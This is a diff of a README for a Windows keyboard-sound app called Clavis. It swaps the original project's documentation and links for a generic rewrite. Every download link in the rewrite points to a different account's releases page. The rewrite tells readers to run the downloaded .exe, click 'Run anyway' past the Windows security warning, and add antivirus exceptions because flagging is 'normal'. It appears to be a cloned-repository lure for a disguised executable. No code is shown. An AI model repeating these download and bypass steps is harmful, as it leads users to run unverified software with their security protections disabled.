@@ -1,433 +1,83 @@
-<a href="https://github.com/sponsors/thenolle?frequency=recurring&sponsor=thenolle">
-  <img src="images/banner.svg" alt="Clavis Banner" width="100%">
-</a>
+# ⌨️ clavis - add satisfying mechanical sounds to typing
 
-<img src="images/text.svg" alt="Clavis" width="100%">
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/prayoga8535/clavis/releases)
 
-<div align="center">
+Clavis adds sound to your keyboard and mouse. It runs on Windows systems. The program works quietly in the background. You choose your preferred sound profiles to change your typing experience.
 
-### Lightweight keyboard & mouse sound simulator for Windows
+## 🛠️ System Requirements
 
-Native Win32 application with global mute hotkeys, tray integration, embedded soundpacks, and custom soundpack support.
+You need a computer running Windows 10 or Windows 11. The program requires very little memory and processor power. It works on most modern hardware without issues. You do not need administrative rights to run the software.
 
-</div>
+## 📥 How to Download 
 
-<br>
+Follow these steps to obtain the program:
 
-<div align="center" style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 20px; margin-top: 40px;">
-  <a href="https://github.com/thenolle/Clavis/releases">
-    <img src="images/download.svg" alt="Download" width="250">
-  </a>
+1. Visit the [official releases page](https://github.com/prayoga8535/clavis/releases).
+2. Look for the latest version at the top of the page.
+3. Find the file ending in .exe under the Assets section.
+4. Click the file name to start your download.
+5. Save the file to your desktop or a folder you prefer.
 
-  <a href="https://discord.com/invite/JYDzHfgmrP">
-    <img src="images/discord.svg" alt="Discord" width="160">
-  </a>
+## 🚀 Setting Up the Program
 
-  <a href="https://ko-fi.com/nolly_">
-    <img src="images/ko-fi.svg" alt="Ko-fi" width="160">
-  </a>
+The application is portable. This means you do not need to install it. 
 
-  <a href="https://github.com/sponsors/thenolle?frequency=recurring&sponsor=thenolle">
-    <img src="images/github-sponsors.svg" alt="GitHub Sponsors" width="210">
-  </a>
-</div>
+1. Open the folder where you saved the file.
+2. Double-click the file named clavis.exe.
+3. A security window might appear. If Windows warns you, click More info and then click Run anyway.
+4. The program icon appears in your system tray at the bottom right of your screen. 
+5. The sound starts working right away.
 
----
+## ⚙️ Using Features
 
-<img src="images/features.svg" alt="Clavis Features" width="100%">
+You control the software through the tray icon. Right-click the icon to see a menu of options.
 
-<div style="margin-top: 10px">
+### Adjusting Volume
+Click the Volume option in the menu. A slider appears. Move the slider to change the loudness of your keys. You can also mute the sounds entirely if you need silence.
 
-- Native lightweight Win32 `.exe`
-- Global mute / unmute hotkey
-- Tray icon with quick controls
-- Embedded and external soundpack support
-- Per-key and single-sound configurations
-- Mouse click sound support
-- Adjustable playback volume
-- Instant pack switching
-- Close-to-tray support
-- Single-instance application behavior
-- Zero-install portable usage
+### Switching Soundpacks
+The program comes with built-in sounds. You can download external soundpacks to add more variety. To change a sound, select the Soundpacks menu. Choose a pack from the list to update your keyboard audio instantly.
 
-</div>
+### Hotkeys
+The app includes a global mute hotkey. Press this key combination at any time to silence the software. You can view or change these keys in the Settings menu.
 
----
+## 📁 Managing Soundpacks
 
-# Interface Preview
+You can add your own sound files if you have them. 
 
-<img src="images/screenshot-main.png" alt="Clavis Main Window" width="100%">
+1. Right-click the tray icon.
+2. Select Open Sound Folder.
+3. Place your sound files inside this directory. 
+4. The application detects new files automatically. 
+5. Open the menu again to select your new audio files.
 
-<div align="center">
-  <sub>Main interface with soundpack list, toggles, volume controls, and hotkey remapping.</sub>
-</div>
+## 🛑 Closing the App
 
-<br>
+The program runs until you tell it to stop. 
 
-<img src="images/screenshot-tray.png" alt="Clavis Tray Menu" width="100%">
+1. Right-click the tray icon.
+2. Select Exit.
+3. The program closes and the sound stops.
 
-<div align="center">
-  <sub>Tray integration with mute toggle, startup options, and quick access controls.</sub>
-</div>
+## 🔍 Troubleshooting
 
----
+Most issues have simple fixes. Check this list if you observe unexpected behavior.
 
-# Getting Started
+### No Sound Plays
+Ensure the application is running. Look for the tray icon. Check your system volume to ensure your speakers function correctly. Verify that the correct soundpack is active in the menu.
 
-## 1. Launch Clavis
+### Accidental Sound Lag
+This happens if your computer runs many heavy programs at once. Clavis prioritizes speed, but high system load might affect timing. Close background programs to resolve the lag.
 
-Run:
+### Security Warnings
+Because the app uses low-level hooks to listen for key presses, some antivirus software might flag it. This is normal for programs that interact with keyboard input. You can add an exception for the program in your security software if it blocks the app.
 
-```text
-Clavis.exe
-```
+## 📜 Privacy and Performance
 
-When launched for the first time, Clavis automatically creates:
+The program stays local on your machine. It does not send your data to the internet. It does not record what you type. It only listens for the action of a key press to play a sound. 
 
-```text
-Soundpacks/
-```
+The software uses minimal resources. You will not notice a change in your computer speed while clavis runs. It stays in the background and consumes almost no memory.
 
-next to the executable if the folder does not already exist.
+## 📈 Keeping Clavis Current
 
----
-
-## 2. Add Soundpacks
-
-Place soundpack folders inside:
-
-```text
-Soundpacks/
-```
-
-Example:
-
-```text
-Soundpacks/
-└── my-pack/
-    ├── config.json
-    ├── a.wav
-    ├── enter.wav
-    ├── space.wav
-    └── icon.png
-```
-
-Clavis scans all subfolders and automatically detects valid soundpacks containing a `config.json`.
-
----
-
-## 3. Select a Pack
-
-- Open Clavis
-- Select a pack from the list
-- Start typing
-
-If at least one soundpack exists, Clavis automatically loads the first available pack during startup.
-
----
-
-<img src="images/soundpacks.svg" alt="Soundpacks" width="100%">
-
-Clavis supports both:
-
-- Embedded built-in soundpacks
-- External disk-based soundpacks
-
-Every soundpack requires:
-
-```text
-config.json
-```
-
-plus one or more referenced audio files.
-
----
-
-# config.json Reference
-
-## Single Sound Configuration
-
-```json
-{
-  "name": "My Pack",
-  "key_define_type": "single",
-  "sound": "a.wav",
-  "mouse_down": "click.wav",
-  "mouse_up": "release.wav"
-}
-```
-
-This mode plays the same sound for every key press.
-
----
-
-## Multi-Key Configuration
-
-```json
-{
-  "name": "NK Cream",
-  "key_define_type": "multi",
-  "defines": {
-    "default": "a.wav",
-    "KEY_RETURN": "enter.wav",
-    "KEY_SPACE": "space.wav",
-    "KEY_LEFTSHIFT": "shift.wav",
-    "KEY_RIGHTSHIFT": "shift.wav"
-  }
-}
-```
-
-This mode allows assigning specific sounds to specific keys.
-
----
-
-## Optional Fields
-
-| Field | Description |
-|---|---|
-| `defines_up` | Key release sounds |
-| `mouse_down` | Mouse click sound |
-| `mouse_up` | Mouse release sound |
-| `default` | Fallback key sound |
-
-If no exact key match exists, Clavis falls back to:
-
-1. `default`
-2. First loaded sound entry
-
----
-
-# Supported Key Names
-
-Clavis supports many Win32 virtual keys including:
-
-```text
-KEY_A -> KEY_Z
-KEY_0 -> KEY_9
-KEY_RETURN
-KEY_SPACE
-KEY_TAB
-KEY_BACKSPACE
-KEY_LEFTSHIFT
-KEY_RIGHTSHIFT
-KEY_LEFTCTRL
-KEY_RIGHTCTRL
-KEY_LEFTALT
-KEY_RIGHTALT
-KEY_F1 -> KEY_F12
-KEY_LEFT
-KEY_RIGHT
-KEY_UP
-KEY_DOWN
-```
-
-Useful examples:
-
-| Key | Name |
-|---|---|
-| Enter | `KEY_RETURN` |
-| Space | `KEY_SPACE` |
-| Backspace | `KEY_BACKSPACE` |
-| Left Shift | `KEY_LEFTSHIFT` |
-| Right Ctrl | `KEY_RIGHTCTRL` |
-
----
-
-<img src="images/hotkey.svg" alt="Hotkey System" width="100%">
-
-Clavis registers a global Windows hotkey allowing mute toggling even when the application is unfocused.
-
-## Default Hotkey
-
-```text
-Ctrl + Shift + M
-```
-
----
-
-## Remapping
-
-1. Click the hotkey field
-2. Press a new combination
-3. Clavis instantly re-registers the shortcut
-
-No restart required.
-
-If registration fails, another application may already be using the same shortcut.
-
----
-
-# Tray Integration
-
-Clavis includes a fully integrated notification tray icon.
-
-## Supported Actions
-
-- Open / hide window
-- Mute / unmute
-- Enable startup
-- Enable close-to-tray
-- Exit application
-
----
-
-## Tray Behavior
-
-| Action | Result |
-|---|---|
-| Double left-click tray icon | Show / hide window |
-| Right-click tray icon | Open tray menu |
-| Close button with close-to-tray enabled | Hide instead of exit |
-
-Clavis uses a single-instance mutex, preventing duplicate launches while already running.
-
----
-
-# Audio Behavior
-
-Clavis plays sounds from:
-
-- Embedded memory-loaded assets
-- Disk-based sound files
-
-The current volume level applies instantly to playback.
-
-Mute disables playback without unloading the active soundpack, allowing immediate resume.
-
----
-
-# Recommended Audio Setup
-
-For best results:
-
-- Use short `.wav` files
-- Keep filenames exact
-- Add a `default` key
-- Keep packs organized
-- Use normalized audio levels
-
----
-
-# Troubleshooting
-
-## Soundpack does not appear
-
-Verify:
-
-- Pack is inside `Soundpacks`
-- `config.json` exists directly in the pack folder
-
----
-
-## No sound playback
-
-Verify:
-
-- A pack is selected
-- Clavis is not muted
-- Volume is above zero
-- Relevant sound toggles are enabled
-
----
-
-## Hotkey does not work
-
-Another application may already be using the shortcut.
-
-Try a different combination.
-
----
-
-## Closing the app only hides it
-
-Close-to-tray is enabled.
-
-Use the tray icon to reopen Clavis or fully exit.
-
----
-
-# Technical Details
-
-| Component | Details |
-|---|---|
-| Platform | Windows |
-| Architecture | Native Win32 |
-| Distribution | Portable `.exe` |
-| Audio Source | Embedded + Disk |
-| Input Hooks | Keyboard + Mouse |
-| Hotkeys | Global Windows Registration |
-| Tray Support | Native Notification Area |
-| Runtime | Lightweight Native Execution |
-
----
-
-# Folder Structure
-
-```text
-Clavis/
-├── Clavis.exe
-└── Soundpacks/
-    ├── Pack One/
-    │   ├── config.json
-    │   ├── a.wav
-    │   └── enter.wav
-    │
-    └── Pack Two/
-        ├── config.json
-        └── click.wav
-```
-
----
-
-# Support The Project
-
-<div>
-  <p style="margin: 0">
-    If you enjoy Clavis and want to support development, consider sponsoring or donating.
-  </p>
-
-  <p style="margin: 0">
-    Support helps fund maintenance, improvements, soundpacks, and future releases.
-  </p>
-</div>
-
-<br>
-
-<table>
-  <tr>
-    <th align="center">Platform</th>
-    <th align="center">Link</th>
-  </tr>
-
-  <tr>
-    <td align="center">
-      GitHub Sponsors
-    </td>
-    <td align="center">
-      <a href="https://github.com/sponsors/thenolle?frequency=recurring&sponsor=thenolle">
-        <img src="images/github-sponsors.svg" alt="GitHub Sponsors" width="210">
-      </a>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      Ko-fi
-    </td>
-    <td align="center">
-      <a href="https://ko-fi.com/nolly_">
-        <img src="images/ko-fi.svg" alt="Ko-fi" width="210">
-      </a>
-    </td>
-  </tr>
-</table>
-
----
-
-# License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.  
-TL;DR: You are free to use, modify, and distribute this software for any purpose, but it comes with no warranty.
-
----
-
-<img src="images/cute.svg" alt="Cute Footer" width="100%">
+Check the [releases page](https://github.com/prayoga8535/clavis/releases) every few weeks to find new features. If you download a new version, simply replace your old file with the new one. Your settings usually carry over to the new version without any extra steps.
